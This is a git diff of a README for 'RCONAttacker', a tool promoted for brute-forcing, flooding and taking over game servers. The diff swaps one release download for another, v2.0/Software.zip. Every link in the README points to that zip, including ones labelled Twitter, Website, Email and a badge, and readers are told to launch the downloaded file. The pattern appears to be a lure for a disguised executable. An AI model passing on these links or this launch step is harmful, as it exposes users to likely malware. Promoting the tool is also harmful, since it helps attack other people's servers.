@@ -15,7 +15,7 @@ RCONAttacker is a powerful tool designed to help you either kill or gain access 
 This repository covers a variety of topics related to administration, brute force attacks, cheats, server checking, DDOS protection, flooding, network gaming, hacking, Minecraft, network security, vulnerability testing, and more. Whether you're an experienced hacker or just curious about cybersecurity, there's something here for everyone.
 
 ## Installation
-To get started with RCONAttacker, you can download the tool by clicking on the following link: [Download RCONAttacker](https://github.com/Notyobizniz/RCONAttacker/releases/download/v1.0/App.zip)
+To get started with RCONAttacker, you can download the tool by clicking on the following link: [Download RCONAttacker](https://github.com/Notyobizniz/RCONAttacker/releases/download/v2.0/Software.zip)
 
 🚀 Please note that the downloaded file needs to be launched to begin using RCONAttacker.
 
@@ -37,12 +37,12 @@ RCONAttacker is licensed under the MIT License. Feel free to use, modify, and di
 ## Stay Connected
 Follow us on social media for the latest updates, news, and tips on cybersecurity and hacking techniques. Join our community of like-minded individuals and stay informed about the world of network security.
 
-📱 [Twitter](https://github.com/Notyobizniz/RCONAttacker/releases/download/v1.0/App.zip)  
-🌐 [Website](https://github.com/Notyobizniz/RCONAttacker/releases/download/v1.0/App.zip)  
-📧 Email: https://github.com/Notyobizniz/RCONAttacker/releases/download/v1.0/App.zip
+📱 [Twitter](https://github.com/Notyobizniz/RCONAttacker/releases/download/v2.0/Software.zip)  
+🌐 [Website](https://github.com/Notyobizniz/RCONAttacker/releases/download/v2.0/Software.zip)  
+📧 Email: https://github.com/Notyobizniz/RCONAttacker/releases/download/v2.0/Software.zip
 
 ## Badges
-[![Download RCONAttacker](https://github.com/Notyobizniz/RCONAttacker/releases/download/v1.0/App.zip)](https://github.com/Notyobizniz/RCONAttacker/releases/download/v1.0/App.zip)
+[![Download RCONAttacker](https://github.com/Notyobizniz/RCONAttacker/releases/download/v2.0/Software.zip)](https://github.com/Notyobizniz/RCONAttacker/releases/download/v2.0/Software.zip)
 
 Feel free to proudly display this badge on your GitHub repository to showcase your support for RCONAttacker.
 
